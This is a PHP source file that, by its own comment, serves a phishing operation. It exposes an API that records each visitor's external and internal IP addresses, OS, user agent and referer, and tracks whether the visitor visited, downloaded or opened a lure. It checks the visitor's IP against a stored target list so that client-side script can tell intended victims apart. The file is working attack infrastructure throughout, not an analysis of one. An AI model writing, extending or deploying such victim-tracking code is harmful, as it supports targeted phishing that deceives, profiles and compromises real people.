<?php

header("Access-Control-Allow-Origin: *");
date_default_timezone_set('Asia/Shanghai');

include "common/db2.php";
include "common/functions.php";

// 这是用来指定进行钓鱼的

$m = isset($_GET['m'])?$_GET['m']:null;
$a = isset($_GET['a'])?$_GET['a']:null;

$id = isset($_GET['id'])?$_GET['id']:'';
$outerIp = isset($_GET['outerIp'])?$_GET['outerIp']:''; //外网ip
$innerIp = isset($_GET['innerIp'])?$_GET['innerIp']:''; //内网ip
$os = isset($_GET['os'])?$_GET['os']:'';
$ua = isset($_GET['ua'])?$_GET['ua']:'';
$referer = isset($_GET['referer'])?$_GET['referer']:'';

if ($m == 'api') {
    if($a == 'isDelete'){
        if(isDelete($id) == 0) { // http://10.10.10.5:7777/index.php?m=api&a=isDelete
            echo json_encode(['isDelete'=>'1']);
        }else{
            echo json_encode(['isDelete'=>'0']);
        }
        exit();
    }else if($a == 'isVisit'){
        if(isVisit($outerIp,  $os, $ua, $innerIp, $referer) == 0) { // http://10.10.10.5:7777/index.php?m=api&a=isExist
            #isSelect();
	    $fishIp = array();
            $tempdata = isSelect();
	    for($i=0;$i<count($tempdata);$i++){
                $fishIp[$i] = $tempdata[$i]['outerIp']; // 117.80.128.104
            }  
            // 这个判断主要返回对js的请求的返回信息
            if (in_array($outerIp, $fishIp, true)) {
                echo json_encode(["isVisit"=>"1", "isTarget"=>"1"]);
            } else {
                echo json_encode(["isVisit"=>"1", "isTarget"=>"0"]);
            }
            exit();
        }else{
            echo json_encode(["isVisit"=>"0", "isTarget"=>"0"]);
        }
        exit();
    }else if($a == 'isDownload'){
        if(isDownload($outerIp) == 0){
            echo json_encode(["isDownload"=>"1"]);
        }else{
            echo json_encode(["isDownload"=>"0"]);
        }
        exit();
    }else if($a == 'isOpen'){
        if(isOpen($outerIp) == 0){
            echo json_encode(["isOpen"=>"1"]);
        }else{
            echo json_encode(["isOpen"=>"0"]);
        }
        exit();
    }else if($a == 'isCloseTarget'){
        if(isCloseTarget($outerIp) == 0){
            echo json_encode(["isCloseTarget"=>"1"]);
        }else{
            echo json_encode(["isCloseTarget"=>"0"]);
        }
        exit();
    }else{
	exit();
    }
}else{
    exit();
}
